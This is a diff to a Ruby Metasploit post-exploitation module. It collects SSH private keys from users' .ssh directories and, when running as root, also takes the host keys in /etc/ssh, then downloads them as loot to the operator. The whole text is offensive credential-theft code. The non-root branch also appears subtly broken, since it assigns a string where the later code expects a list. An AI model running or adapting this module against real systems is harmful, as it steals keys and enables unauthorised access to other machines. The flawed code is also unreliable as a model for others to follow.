@@ -35,8 +35,17 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		print_status("Finding .ssh directories")
-		paths = enum_user_directories.map {|d| d + "/.ssh"}
+		if got_root?
+			print_status("Finding .ssh directories")
+			paths = enum_user_directories.map {|d| d + "/.ssh"}
+			
+			# Grab the contents of /etc/ssh as well. A host key is fine too.
+			print_status("Adding /etc/ssh to list of directories to loot")
+			paths.push('/etc/ssh')
+		else
+			print_status("Not root, checking user's home dir")
+			paths = ("#{home}/#{user}/.ssh")
+		end
 
 		# Array#select! is only in 1.9
 		paths = paths.select { |d| directory?(d) }
@@ -44,11 +53,7 @@ class Metasploit3 < Msf::Post
 		if paths.nil? or paths.empty?
 			print_error("No users found with a .ssh directory")
 		end
-
-		# Grab the contents of /etc/ssh as well. A host key is fine too.
-		print_status("Adding /etc/ssh to list of directories to loot")
-		paths.push('/etc/ssh')
-
+		
 		download_loot(paths)
 	end
 
